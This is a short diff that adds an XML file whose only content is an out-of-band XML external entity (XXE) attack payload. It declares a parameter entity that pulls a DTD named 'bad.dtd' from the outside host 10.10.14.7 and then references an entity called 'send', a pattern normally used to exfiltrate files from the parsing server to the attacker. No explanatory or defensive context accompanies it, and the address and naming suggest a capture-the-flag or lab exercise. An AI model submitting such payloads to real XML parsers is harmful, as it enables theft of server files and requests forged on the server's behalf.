@@ -1,0 +1,8 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE student [
+<!ELEMENT student ANY>
+<!ENTITY % student SYSTEM "http://10.10.14.7/bad.dtd">
+%student;
+]>
+
+<student>&send;</student>
